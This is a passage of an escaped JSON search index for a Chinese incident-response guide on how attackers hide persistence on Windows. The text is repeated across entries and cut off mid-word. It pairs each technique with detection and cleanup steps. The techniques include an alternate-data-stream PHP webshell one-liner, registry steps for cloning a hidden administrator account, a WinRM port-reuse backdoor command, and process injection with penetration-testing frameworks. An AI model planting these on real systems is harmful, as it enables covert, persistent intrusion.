\u9690\u85cf\u7cfb\u7edf\u7528\u6237\u64cd\u4f5c\uff0cCMD\u547d\u4ee4\u884c\u4e0b\uff0c\u5efa\u7acb\u4e86\u4e00\u4e2a\u7528\u6237\u540d\u4e3a\u201ctest$\u201d\uff0c\u5bc6\u7801\u4e3a\u201cabc123!\u201d\u7684\u7b80\u5355\u9690\u85cf\u8d26\u6237,\u5e76\u4e14\u628a\u8be5\u9690\u85cf\u8d26\u6237\u63d0\u5347\u4e3a\u4e86\u7ba1\u7406\u5458\u6743\u9650\u3002 PS:CMD\u547d\u4ee4\u884c\u4f7f\u7528\"net user\",\u770b\u4e0d\u5230\"test$\"\u8fd9\u4e2a\u8d26\u53f7\uff0c\u4f46\u5728\u63a7\u5236\u9762\u677f\u548c\u672c\u5730\u7528\u6237\u548c\u7ec4\u662f\u53ef\u4ee5\u663e\u793a\u6b64\u7528\u6237\u7684\u3002 \u514b\u9686\u8d26\u53f7\u5236\u4f5c\u8fc7\u7a0b\uff1a 1\u3001\u201c\u5f00\u59cb\u201d\u2192\u201c\u8fd0\u884c\u201d\uff0c\u8f93\u5165\u201cregedt32.exe\u201d\u540e\u56de\u8f66,\u9700\u8981\u5230\u201cHKEY_LOCAL_MACHINE\\SAM\\SAM\u201d\uff0c\u5355\u673a\u53f3\u5efa\u6743\u9650\uff0c\u628a\u540d\u53eb\uff1aadministrator\u7684\u7528\u6237\u7ed9\u4e88\uff1a\u5b8c\u5168\u63a7\u5236\u4ee5\u53ca\u8bfb\u53d6\u7684\u6743\u9650\uff0c\u5728\u540e\u9762\u6253\u52fe\u5c31\u884c\uff0c\u7136\u540e\u5173\u95ed\u6ce8\u518c\u8868\u7f16\u8f91\u5668\uff0c\u518d\u6b21\u6253\u5f00\u5373\u53ef\u3002 2\u3001\u6765\u5230\u6ce8\u518c\u8868\u7f16\u8f91\u5668\u7684\u201cHKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names\u201d\u5904\uff0c\u70b9\u51fbtest$\u7528\u6237\uff0c\u5f97\u5230\u5728\u53f3\u8fb9\u663e\u793a\u7684\u952e\u503c\u4e2d\u7684\u201c\u7c7b\u578b\u201d\u4e00\u9879\u663e\u793a\u4e3a0x3ec\uff0c\u627e\u5230\u7bad\u5934\u6240\u6307\u76ee\u5f55\u3002 3\u3001\u627e\u5230administrator\u6240\u5bf9\u5e94\u7684\u7684\u9879\u4e3a\u201c000001F4\u201d\uff0c\u5c06\u201c000001F4\u201d\u7684F\u503c\u590d\u5236\u5230\u201c000003EC\u201d\u7684F\u503c\u4e2d\uff0c\u4fdd\u5b58\u3002 4\u3001\u5206\u522btest \u548c\u201c000003EC\u5bfc\u51fa\u5230\u684c\u9762\uff0c\u5220\u9664test \u548c\u201c000003EC\u5bfc\u51fa\u5230\u684c\u9762\uff0c\u5220\u9664test \u7528\u6237 net user test$ /del 5\u3001\u5c06\u521a\u624d\u5bfc\u51fa\u7684\u4e24\u4e2a\u540e\u7f00\u4e3a.reg\u7684\u6ce8\u518c\u8868\u9879\u5bfc\u5165\u6ce8\u518c\u8868\u4e2d\u3002\u8fd9\u6837\u6240\u8c13\u7684\u9690\u85cf\u8d26\u6237\u5c31\u521b\u5efa\u597d\u4e86\u3002PS\uff1a\u4e0d\u7ba1\u4f60\u662f\u5728\u547d\u4ee4\u63d0\u793a\u7b26\u4e0b\u8f93\u5165net user \u6216\u8005\u5728\u7cfb\u7edf\u7528\u6237\u7ba1\u7406\u754c\u9762\u90fd\u662f\u770b\u4e0d\u5230test$\u8fd9\u4e2a\u8d26\u6237\u7684\uff0c\u53ea\u6709\u5728\u6ce8\u518c\u8868\u4e2d\u624d\u80fd\u770b\u5f97\u5230\u3002 \u68c0\u6d4b\u548c\u6e05\u7406\u65b9\u6cd5\uff1a \u4f7f\u7528D\u76fe_web\u67e5\u6740\u5de5\u5177\uff0c\u4f7f\u7528\u514b\u9686\u8d26\u53f7\u68c0\u6d4b\u529f\u80fd\u8fdb\u884c\u67e5\u770b\uff0c\u53ef\u68c0\u6d4b\u51fa\u9690\u85cf\u3001\u514b\u9686\u8d26\u53f7\u3002 0x03 \u7aef\u53e3\u590d\u7528 \u00b6 \u901a\u8fc7\u7aef\u53e3\u590d\u7528\u6765\u8fbe\u5230\u9690\u85cf\u7aef\u53e3\u7684\u76ee\u7684\uff0c\u5728Window\u4e0b\uff0c\u5982\u4f55\u5b9e\u73b0\u7aef\u53e3\u590d\u7528\u5462\uff1f \u524d\u9635\u5b50\uff0c@Twi1ight\u516c\u5e03\u4e86\u4e00\u79cd\u57fa\u4e8e\u5185\u7f6e\u7cfb\u7edf\u670d\u52a1\u7684\u7aef\u53e3\u590d\u7528\u540e\u95e8\u65b9\u6cd5\uff0c\u5229\u7528WinRM\u670d\u52a1\uff0c\u4e00\u6761\u547d\u4ee4\u5b9e\u73b0\u7aef\u53e3\u590d\u7528\u540e\u95e8\uff1a winrm set winrm/config/service @{EnableCompatibilityHttpListener=\"true\"} \u4e00\u822c\u5f00\u542fWinRM\u670d\u52a1\u4f5c\u4e3a\u8fdc\u7a0b\u7ba1\u7406\uff0c\u4f46\u8fd8\u662f\u7b2c\u4e00\u6b21\u542c\u5230\u53ef\u4ee5\u4f5c\u4e3a\u7aef\u53e3\u590d\u7528\uff0c\u4e00\u79cd\u7b80\u5355\u5bb9\u6613\u5b9e\u73b0\u7684\u7aef\u53e3\u590d\u7528\u65b9\u5f0f\u3002\u5047\u8bbe\uff0c\u653b\u51fb\u8005\u5df2\u83b7\u53d6\u5230administrator\u8d26\u53f7\u5bc6\u7801\uff0c\u8fde\u63a5\u8fdc\u7a0bWinRM\u670d\u52a1\u6267\u884c\u547d\u4ee4\uff1a \u5f53\u6267\u884c\u8fd9\u6761\u547d\u4ee4\u7684\u540c\u65f6\uff0c\u5c06\u5728\u5b89\u5168\u65e5\u5fd7\u4e2d\u7559\u4e0b\u75d5\u8ff9\uff0c \u53e6\u5916\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee3\u7801\u5b9e\u73b0\u7aef\u53e3\u590d\u7528\u91cd\u5b9a\u5411\uff0c\u5de5\u5177\uff1a https://github.com/crabkun/Switcher 0x04 \u8fdb\u7a0b\u6ce8\u5165 \u00b6 \u8fdb\u7a0b\u6ce8\u5165\uff0c\u4e00\u76f4\u662f\u75c5\u6bd2\u6728\u9a6c\u7684\u60ef\u7528\u624b\u6bb5\uff0c\u540c\u65f6\uff0c\u5b83\u4e5f\u662f\u4e00\u79cd\u9690\u85cf\u6280\u672f\u3002\u5728\u5e38\u89c1\u7684\u6e17\u900f\u6d4b\u8bd5\u6846\u67b6\u4e2d\uff0c\u8fdb\u7a0b\u6ce8\u5165\u662f\u600e\u4e48\u505a\u7684\u4ee5\u53ca\u6211\u4eec\u5982\u4f55\u901a\u8fc7\u5de5\u5177\u6392\u67e5\u51fa\u6765\uff1f 1\u3001meterpreter\u4f1a\u8bdd\u6ce8\u5165 \u5f53\u524d\u6743\u9650\u65e0\u6cd5\u83b7\u53d6hash\u503c\uff0c\u67e5\u770b\u76ee\u524d\u7cfb\u7edf\u8fdb\u7a0b \u901a\u8fc7migrate\u5c06\u8fdb\u7a0b\u6ce8\u5165\u5230system\u8fdb\u7a0b\u540e\uff0c\u6210\u529f\u83b7\u5f97hash\u503c\u3002 Window\u540e\u95e8\u6392\u67e5\uff1a \u901a\u8fc7TCPview\u663e\u793a\u5df2\u5efa\u7acb\u7684TCP\u8fde\u63a5\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5f02\u5e38\u7684\u8fde\u63a5\uff0c\u540c\u65f6\uff0c\u6076\u610f\u8f6f\u4ef6\u5c06\u4ee5\u7eff\u8272\u663e\u793a\u4e0d\u5230\u4e00\u79d2\u949f\uff0c\u7136\u540e\u53d8\u6210\u7ea2\u8272\u6d88\u5931\uff0c\u5982\u6b64\u5faa\u73af\u3002 2\u3001Empire\u4f1a\u8bdd\u8fdb\u7a0b\u6ce8\u5165 \u901a\u8fc7psinject\u6a21\u5757\u8fdb\u884c\u4f1a\u8bdd\u6ce8\u5165\uff0c\u76f4\u63a5\u8f93\u5165ps\u9009\u62e9\u4e00\u4e2aSYSTEM\u6743\u9650\u7684\u8fdb\u7a0bPID\uff0c\u4f7f\u7528\u8fdb\u7a0b\u6ce8\u5165\u6a21\u5757\uff0c\u6765\u83b7\u53d6\u6743\u9650\u3002\u5982\u4e0b\u56fe\uff1a Window\u540e\u95e8\u6392\u67e5\uff1a\u5229\u7528process monitor\u6216\u8005\u706b\u7ed2\u5251\u76d1\u63a7\u8fdb\u7a0b\u90fd\u53ef\u4ee5\u5b9a\u4f4d\u5230\u6ce8\u5165\u8fdb\u7a0b\u3002 3\u3001Cobalt Strike\u8fdb\u7a0b\u6ce8\u5165 \u9009\u62e9\u8fdb\u7a0b\uff0c\u70b9\u51fbinject\uff0c\u968f\u540e\u9009\u62e9\u76d1\u542c\u5668\uff0c\u70b9\u51fbchoose\uff0c\u5373\u53ef\u53d1\u73b0Cobaltstrike\u5f39\u56de\u4e86\u76ee\u6807\u673a\u7684\u4e00\u4e2a\u65b0\u4f1a\u8bdd\uff0c\u8fd9\u4e2a\u4f1a\u8bdd\u5c31\u662f\u6210\u529f\u6ce8\u5165\u5230\u67d0\u8fdb\u7a0b\u7684beacon\u3002 Window\u540e\u95e8\u6392\u67e5\uff1a\u5229\u7528process monitor\u6355\u6349\u901a\u4fe1\u8fc7\u7a0b\uff0c\u6709\u89c4\u5f8b\u7684\u8bf7\u6c42\u53d6\u51b3\u4e8esleep\u8bbe\u7f6e\u7684\u95f4\u9694\u3002 0x05 \u7ed3\u675f \u00b6 \u672c\u6587\u4e3b\u8981\u4ecb\u7ecd\u4e86Window\u4e0b\u7684\u51e0\u79cd\u9690\u85cf\u6280\u672f\uff0c\u5305\u62ec\u9690\u85cf\u6587\u4ef6\u3001\u9690\u85cf\u8d26\u53f7\u3001\u7aef\u53e3\u590d\u7528\u3001\u8fdb\u7a0b\u6ce8\u5165\u7b49\u65b9\u9762\u7684\u7b80\u5355\u5b9e\u73b0\u53ca\u5176\u6392\u67e5\u6280\u5de7\u3002\u4ec5\u4f5c\u629b\u7816\u5f15\u7389\u4e4b\u7528\uff0c\u6b22\u8fce\u7559\u8a00\u5206\u4eab\u3002","title":"\u7b2c1\u7bc7\uff1aWindows\u6743\u9650\u7ef4\u6301--\u9690\u85cf\u7bc7"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E9%9A%90%E8%97%8F%E7%AF%87/#0x00-\u524d\u8a00","text":"\u653b\u51fb\u8005\u5728\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u540e\uff0c\u901a\u5e38\u4f1a\u7528\u4e00\u4e9b\u540e\u95e8\u6765\u7ef4\u6301\u6743\u9650\uff0c\u5982\u679c\u4f60\u60f3\u8ba9\u4f60\u7684\u540e\u95e8\u4fdd\u6301\u7684\u66f4\u4e45\u4e9b\uff0c\u90a3\u4e48\u8bf7\u9690\u85cf\u597d\u5b83\uff0c\u4f7f\u4e4b\u4e0d\u6613\u88ab\u7ba1\u7406\u5458\u53d1\u73b0\u3002","title":"0x00 \u524d\u8a00"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E9%9A%90%E8%97%8F%E7%AF%87/#0x01-\u9690\u85cf\u6587\u4ef6","text":"1\u3001\u5229\u7528\u6587\u4ef6\u5c5e\u6027 \u6700\u7b80\u5355\u7684\u4e00\u79cd\u9690\u85cf\u6587\u4ef6\u7684\u65b9\u5f0f\uff0c\u6587\u4ef6\u53f3\u952e\u5c5e\u6027\uff0c\u52fe\u9009\u9690\u85cf\uff0c\u70b9\u51fb\u786e\u5b9a\u540e\uff0c\u5728\u8fd9\u4e2a\u6587\u4ef6\u91cc\u770b\u4e0d\u5230\u521a\u521a\u7684\u6587\u4ef6\u4e86\u3002 \u5982\u679c\u8981\u8ba9\u6587\u4ef6\u663e\u793a\u51fa\u6765\uff0c\u5c31\u70b9\u51fb\u67e5\u770b\uff0c\u52fe\u9009\u663e\u793a\u9690\u85cf\u7684\u6587\u4ef6\uff0c\u6587\u4ef6\u5c31\u663e\u793a\u51fa\u6765\u3002 \u5982\u4f55\u771f\u6b63\u9690\u85cf\u6587\u4ef6\uff1f \u4f7f\u7528Attrib +s +a +h +r\u547d\u4ee4\u5c31\u662f\u628a\u539f\u672c\u7684\u6587\u4ef6\u5939\u589e\u52a0\u4e86\u7cfb\u7edf\u6587\u4ef6\u5c5e\u6027\u3001\u5b58\u6863\u6587\u4ef6\u5c5e\u6027\u3001\u53ea\u8bfb\u6587\u4ef6\u5c5e\u6027\u548c\u9690\u85cf\u6587\u4ef6\u5c5e\u6027\u3002 attrib +s +a +h +r D:\\test\\project\\test .txt \u8fd9\u6837\u5c31\u505a\u5230\u4e86\u771f\u6b63\u7684\u9690\u85cf\uff0c\u4e0d\u7ba1\u4f60\u662f\u5426\u663e\u793a\u9690\u85cf\u6587\u4ef6\uff0c\u6b64\u6587\u4ef6\u5939\u90fd\u770b\u4e0d\u89c1\u3002 \u7834\u89e3\u9690\u85cf\u6587\u4ef6\uff1a \u6253\u5f00\u7535\u8111\u6587\u4ef6\u5939\u9009\u9879\u5361\uff0c\u53d6\u6d88\u201d\u9690\u85cf\u53d7\u4fdd\u62a4\u7684\u64cd\u4f5c\u7cfb\u7edf\u6587\u4ef6\u201c\u52fe\u9009\uff0c\u628a\u201d\u9690\u85cf\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u201c\u4e0b\u9762\u7684\u5355\u9009\u9009\u62e9\u201c\u663e\u793a\u9690\u85cf\u7684\u6587\u4ef6\u3001\u6587\u4ef6\u5939\u548c\u9a71\u52a8\u5668\u201d\u3002 2\u3001\u5229\u7528ADS\u9690\u85cf\u6587\u4ef6\u5185\u5bb9 \u200b \u5728\u670d\u52a1\u5668\u4e0aecho\u4e00\u4e2a\u6570\u636e\u6d41\u6587\u4ef6\u8fdb\u53bb\uff0c\u6bd4\u5982index.php\u662f\u7f51\u9875\u6b63\u5e38\u6587\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u8fd9\u6837\u5b50\u641e\uff1a \u3000 echo ^<?php @eval($_POST['chopper']);?^> > index.php:hidden.jpg \u8fd9\u6837\u5b50\u5c31\u751f\u6210\u4e86\u4e00\u4e2a\u4e0d\u53ef\u89c1\u7684shell hidden.jpg\uff0c\u5e38\u89c4\u7684\u6587\u4ef6\u7ba1\u7406\u5668\u3001type\u547d\u4ee4\uff0cdir\u547d\u4ee4\u3001del\u547d\u4ee4\u53d1\u73b0\u90fd\u627e\u4e0d\u51fa\u90a3\u4e2ahidden.jpg\u7684\u3002\u3000 \u95ee\u98981\uff1a\u5982\u4f55\u67e5\u770bindex.php:hidden.jpg\u5185\u5bb9\u5462\uff1f \u3000\u3000 \u8fdb\u5165\u6587\u4ef6\u6240\u5728\u76ee\u5f55\uff0cnotepad index.php:hidden.jpg \u6216\u8005 dir /r \u3000\u3000 \u95ee\u98982\uff1a\u5982\u4f55\u5220\u9664index.php:hidden.jpg\uff1f \u76f4\u63a5\u5220\u9664index.php\u5373\u53ef 3\u3001\u9a71\u52a8\u7ea7\u6587\u4ef6\u9690\u85cf \u9a71\u52a8\u9690\u85cf\u6211\u4eec\u53ef\u4ee5\u7528\u8fc7\u4e00\u4e9b\u8f6f\u4ef6\u6765\u5b9e\u73b0\uff0c\u8f6f\u4ef6\u540d\u5b57\u53eb\uff1aEasy File Locker \u4e0b\u8f7d\u94fe\u63a5\uff1a http://www.xoslab.com/efl.html \u5982\u679c\u4f60\u5728\u7f51\u7ad9\u76ee\u5f55\u672a\u67e5\u627e\u5230\u76f8\u5173\u6587\u4ef6\uff0c\u4e14\u7cfb\u7edf\u76ee\u5f55\u5b58\u5728\u5b58\u5728\u4ee5\u4e0b\u6587\u4ef6\uff1a c:\\WINDOWS\\xlkfs.dat c:\\WINDOWS\\xlkfs.dll c:\\WINDOWS\\xlkfs.ini c:\\WINDOWS\\system32\\drivers\\xlkfs.sys \u90a3\u4e48\u4f60\uff0c\u5e94\u8be5\u662f\u906d\u9047\u4e86\u9a71\u52a8\u7ea7\u6587\u4ef6\u9690\u85cf\u3002 \u5982\u4f55\u6e05\u9664\uff1f 1\u3001\u67e5\u8be2\u670d\u52a1\u72b6\u6001\uff1a sc qc xlkfs 2\u3001\u505c\u6b62\u670d\u52a1\uff1a net stop xlkfs \u670d\u52a1\u505c\u6b62\u4ee5\u540e\uff0c\u7ecf\u9a71\u52a8\u7ea7\u9690\u85cf\u7684\u6587\u4ef6\u5373\u53ef\u663e\u73b0 3\u3001\u5220\u9664\u670d\u52a1\uff1a sc delete xlkfs 4\u3001\u5220\u9664\u7cfb\u7edf\u76ee\u5f55\u4e0b\u9762\u7684\u6587\u4ef6\uff0c\u91cd\u542f\u7cfb\u7edf\uff0c\u786e\u8ba4\u670d\u52a1\u5df2\u7ecf\u88ab\u6e05\u7406\u4e86\u3002 \u9690\u85cf\u6587\u4ef6\u7684\u65b9\u5f0f\u8fd8\u6709\u5f88\u591a\uff0c\u6bd4\u5982\u4f2a\u88c5\u6210\u4e00\u4e2a\u7cfb\u7edf\u6587\u4ef6\u5939\u56fe\u6807\uff0c\u5229\u7528\u7578\u5f62\u6587\u4ef6\u540d\u3001\u4fdd\u7559\u6587\u4ef6\u540d\u65e0\u6cd5\u5220\u9664\uff0c\u751a\u81f3\u53d6\u4e00\u4e2a\u4e0e\u7cfb\u7edf\u6587\u4ef6\u5f88\u50cf\u7684\u6587\u4ef6\u540d\u5e76\u653e\u5728\u6b63\u5e38\u76ee\u5f55\u91cc\u9762\uff0c\u5f88\u96be\u8fa8\u522b\u51fa\u6765\u3002 \u8fd9\u4e9b\u9690\u85cf\u6587\u4ef6\u7684\u65b9\u5f0f\u65e9\u5df2\u4e0d\u518d\u662f\u79d8\u5bc6\uff0c\u800c\u66f4\u591a\u7684\u6076\u610f\u7a0b\u5e8f\u5f00\u59cb\u5b9e\u73b0\u201c\u65e0\u6587\u4ef6\u201d\u653b\u51fb\uff0c\u8fd9\u79cd\u65b9\u5f0f\u6781\u96be\u88ab\u53d1\u73b0\u3002","title":"0x01 \u9690\u85cf\u6587\u4ef6"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E9%9A%90%E8%97%8F%E7%AF%87/#0x02-\u9690\u85cf\u8d26\u53f7","text":"window \u9690\u85cf\u7cfb\u7edf\u7528\u6237\u64cd\u4f5c\uff0cCMD\u547d\u4ee4\u884c\u4e0b\uff0c\u5efa\u7acb\u4e86\u4e00\u4e2a\u7528\u6237\u540d\u4e3a\u201ctest$\u201d\uff0c\u5bc6\u7801\u4e3a\u201cabc123!\u201d\u7684\u7b80\u5355\u9690\u85cf\u8d26\u6237,\u5e76\u4e14\u628a\u8be5\u9690\u85cf\u8d26\u6237\u63d0\u5347\u4e3a\u4e86\u7ba1\u7406\u5458\u6743\u9650\u3002 PS:CMD\u547d\u4ee4\u884c\u4f7f\u7528\"net user\",\u770b\u4e0d\u5230\"test$\"\u8fd9\u4e2a\u8d26\u53f7\uff0c\u4f46\u5728\u63a7\u5236\u9762\u677f\u548c\u672c\u5730\u7528\u6237\u548c\u7ec4\u662f\u53ef\u4ee5\u663e\u793a\u6b64\u7528\u6237\u7684\u3002 \u514b\u9686\u8d26\u53f7\u5236\u4f5c\u8fc7\u7a0b\uff1a 1\u3001\u201c\u5f00\u59cb\u201d\u2192\u201c\u8fd0\u884c\u201d\uff0c\u8f93\u5165\u201cregedt32.exe\u201d\u540e\u56de\u8f66,\u9700\u8981\u5230\u201cHKEY_LOCAL_MACHINE\\SAM\\SAM\u201d\uff0c\u5355\u673a\u53f3\u5efa\u6743\u9650\uff0c\u628a\u540d\u53eb\uff1aadministrator\u7684\u7528\u6237\u7ed9\u4e88\uff1a\u5b8c\u5168\u63a7\u5236\u4ee5\u53ca\u8bfb\u53d6\u7684\u6743\u9650\uff0c\u5728\u540e\u9762\u6253\u52fe\u5c31\u884c\uff0c\u7136\u540e\u5173\u95ed\u6ce8\u518c\u8868\u7f16\u8f91\u5668\uff0c\u518d\u6b21\u6253\u5f00\u5373\u53ef\u3002 2\u3001\u6765\u5230\u6ce8\u518c\u8868\u7f16\u8f91\u5668\u7684\u201cHKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names\u201d\u5904\uff0c\u70b9\u51fbtest$\u7528\u6237\uff0c\u5f97\u5230\u5728\u53f3\u8fb9\u663e\u793a\u7684\u952e\u503c\u4e2d\u7684\u201c\u7c7b\u578b\u201d\u4e00\u9879\u663e\u793a\u4e3a0x3ec\uff0c\u627e\u5230\u7bad\u5934\u6240\u6307\u76ee\u5f55\u3002 3\u3001\u627e\u5230administrator\u6240\u5bf9\u5e94\u7684\u7684\u9879\u4e3a\u201c000001F4\u201d\uff0c\u5c06\u201c000001F4\u201d\u7684F\u503c\u590d\u5236\u5230\u201c000003EC\u201d\u7684F\u503c\u4e2d\uff0c\u4fdd\u5b58\u3002 4\u3001\u5206\u522btest \u548c\u201c000003EC\u5bfc\u51fa\u5230\u684c\u9762\uff0c\u5220\u9664test \u548c\u201c000003EC\u5bfc\u51fa\u5230\u684c\u9762\uff0c\u5220\u9664test \u7528\u6237 net user test$ /del 5\u3001\u5c06\u521a\u624d\u5bfc\u51fa\u7684\u4e24\u4e2a\u540e\u7f00\u4e3a.reg\u7684\u6ce8\u518c\u8868\u9879\u5bfc\u5165\u6ce8\u518c\u8868\u4e2d\u3002\u8fd9\u6837\u6240\u8c13\u7684\u9690\u85cf\u8d26\u6237\u5c31\u521b\u5efa\u597d\u4e86\u3002PS\uff1a\u4e0d\u7ba1\u4f60\u662f\u5728\u547d\u4ee4\u63d0\u793a\u7b26\u4e0b\u8f93\u5165net user \u6216\u8005\u5728\u7cfb\u7edf\u7528\u6237\u7ba1\u7406\u754c\u9762\u90fd\u662f\u770b\u4e0d\u5230test$\u8fd9\u4e2a\u8d26\u6237\u7684\uff0c\u53ea\u6709\u5728\u6ce8\u518c\u8868\u4e2d\u624d\u80fd\u770b\u5f97\u5230\u3002 \u68c0\u6d4b\u548c\u6e05\u7406\u65b9\u6cd5\uff1a \u4f7f\u7528D\u76fe_web\u67e5\u6740\u5de5\u5177\uff0c\u4f7f\u7528\u514b\u9686\u8d26\u53f7\u68c0\u6d4b\u529f\u80fd\u8fdb\u884c\u67e5\u770b\uff0c\u53ef\u68c0\u6d4b\u51fa\u9690\u85cf\u3001\u514b\u9686\u8d26\u53f7\u3002","title":"0x02 \u9690\u85cf\u8d26\u53f7"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E9%9A%90%E8%97%8F%E7%AF%87/#0x03-\u7aef\u53e3\u590d\u7528","text":"\u901a\u8fc7\u7aef\u53e3\u590d\u7528\u6765\u8fbe\u5230\u9690\u85cf\u7aef\u53e3\u7684\u76ee\u7684\uff0c\u5728Window\u4e0b\uff0c\u5982\u4f55\u5b9e\u73b0\u7aef\u53e3\u590d\u7528\u5462\uff1f \u524d\u9635\u5b50\uff0c@Twi1ight\u516c\u5e03\u4e86\u4e00\u79cd\u57fa\u4e8e\u5185\u7f6e\u7cfb\u7edf\u670d\u52a1\u7684\u7aef\u53e3\u590d\u7528\u540e\u95e8\u65b9\u6cd5\uff0c\u5229\u7528WinRM\u670d\u52a1\uff0c\u4e00\u6761\u547d\u4ee4\u5b9e\u73b0\u7aef\u53e3\u590d\u7528\u540e\u95e8\uff1a winrm set winrm/config/service @{EnableCompatibilityHttpListener=\"true\"} \u4e00\u822c\u5f00\u542fWinRM\u670d\u52a1\u4f5c\u4e3a\u8fdc\u7a0b\u7ba1\u7406\uff0c\u4f46\u8fd8\u662f\u7b2c\u4e00\u6b21\u542c\u5230\u53ef\u4ee5\u4f5c\u4e3a\u7aef\u53e3\u590d\u7528\uff0c\u4e00\u79cd\u7b80\u5355\u5bb9\u6613\u5b9e\u73b0\u7684\u7aef\u53e3\u590d\u7528\u65b9\u5f0f\u3002\u5047\u8bbe\uff0c\u653b\u51fb\u8005\u5df2\u83b7\u53d6\u5230administrator\u8d26\u53f7\u5bc6\u7801\uff0c\u8fde\u63a5\u8fdc\u7a0bWinRM\u670d\u52a1\u6267\u884c\u547d\u4ee4\uff1a \u5f53\u6267\u884c\u8fd9\u6761\u547d\u4ee4\u7684\u540c\u65f6\uff0c\u5c06\u5728\u5b89\u5168\u65e5\u5fd7\u4e2d\u7559\u4e0b\u75d5\u8ff9\uff0c \u53e6\u5916\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee3\u7801\u5b9e\u73b0\u7aef\u53e3\u590d\u7528\u91cd\u5b9a\u5411\uff0c\u5de5\u5177\uff1a https://github.com/crabkun/Switcher","title":"0x03 \u7aef\u53e3\u590d\u7528"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E9%9A%90%E8%97%8F%E7%AF%87/#0x04-\u8fdb\u7a0b\u6ce8\u5165","text":"\u8fdb\u7a0b\u6ce8\u5165\uff0c\u4e00\u76f4\u662f\u75c5\u6bd2\u6728\u9a6c\u7684\u60ef\u7528\u624b\u6bb5\uff0c\u540c\u65f6\uff0c\u5b83\u4e5f\u662f\u4e00\u79cd\u9690\u85cf\u6280\u672f\u3002\u5728\u5e38\u89c1\u7684\u6e17\u900f\u6d4b\u8bd5\u6846\u67b6\u4e2d\uff0c\u8fdb\u7a0b\u6ce8\u5165\u662f\u600e\u4e48\u505a\u7684\u4ee5\u53ca\u6211\u4eec\u5982\u4f55\u901a\u8fc7\u5de5\u5177\u6392\u67e5\u51fa\u6765\uff1f 1\u3001meterpreter\u4f1a\u8bdd\u6ce8\u5165 \u5f53\u524d\u6743\u9650\u65e0\u6cd5\u83b7\u53d6hash\u503c\uff0c\u67e5\u770b\u76ee\u524d\u7cfb\u7edf\u8fdb\u7a0b \u901a\u8fc7migrate\u5c06\u8fdb\u7a0b\u6ce8\u5165\u5230system\u8fdb\u7a0b\u540e\uff0c\u6210\u529f\u83b7\u5f97hash\u503c\u3002 Window\u540e\u95e8\u6392\u67e5\uff1a \u901a\u8fc7TCPview\u663e\u793a\u5df2\u5efa\u7acb\u7684TCP\u8fde\u63a5\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5f02\u5e38\u7684\u8fde\u63a5\uff0c\u540c\u65f6\uff0c\u6076\u610f\u8f6f\u4ef6\u5c06\u4ee5\u7eff\u8272\u663e\u793a\u4e0d\u5230\u4e00\u79d2\u949f\uff0c\u7136\u540e\u53d8\u6210\u7ea2\u8272\u6d88\u5931\uff0c\u5982\u6b64\u5faa\u73af\u3002 2\u3001Empire\u4f1a\u8bdd\u8fdb\u7a0b\u6ce8\u5165 \u901a\u8fc7psinject\u6a21\u5757\u8fdb\u884c\u4f1a\u8bdd\u6ce8\u5165\uff0c\u76f4\u63a5\u8f93\u5165ps\u9009\u62e9\u4e00\u4e2aSYSTEM\u6743\u9650\u7684\u8fdb\u7a0bPID\uff0c\u4f7f\u7528\u8fdb\u7a0b\u6ce8\u5165\u6a21\u5757\uff0c\u6765\u83b7\u53d6\u6743\u9650\u3002\u5982\u4e0b\u56fe\uff1a Window\u540e\u95e8\u6392\u67e5\uff1a\u5229\u7528process monitor\u6216\u8005\u706b\u7ed2\u5251\u76d1\u63a7\u8fdb\u7a0b\u90fd\u53ef\u4ee5\u5b9a\u4f4d\u5230\u6ce8\u5165\u8fdb\u7a0b\u3002 3\u3001Cobalt Strike\u8fdb\u7a0b\u6ce8\u5165 \u9009\u62e9\u8fdb\u7a0b\uff0c\u70b9\u51fbinject\uff0c\u968f\u540e\u9009\u62e9\u76d1\u542c\u5668\uff0c\u70b9\u51fbchoose\uff0c\u5373\u53ef\u53d1\u73b0Cobaltstrike\u5f39\u56de\u4e86\u76ee\u6807\u673a\u7684\u4e00\u4e2a\u65b0\u4f1a\u8bdd\uff0c\u8fd9\u4e2a\u4f1a\u8bdd\u5c31\u662f\u6210\u529f\u6ce8\u5165\u5230\u67d0\u8fdb\u7a0b\u7684beacon\u3002 Window\u540e\u95e8\u6392\u67e5\uff1a\u5229\u7528process 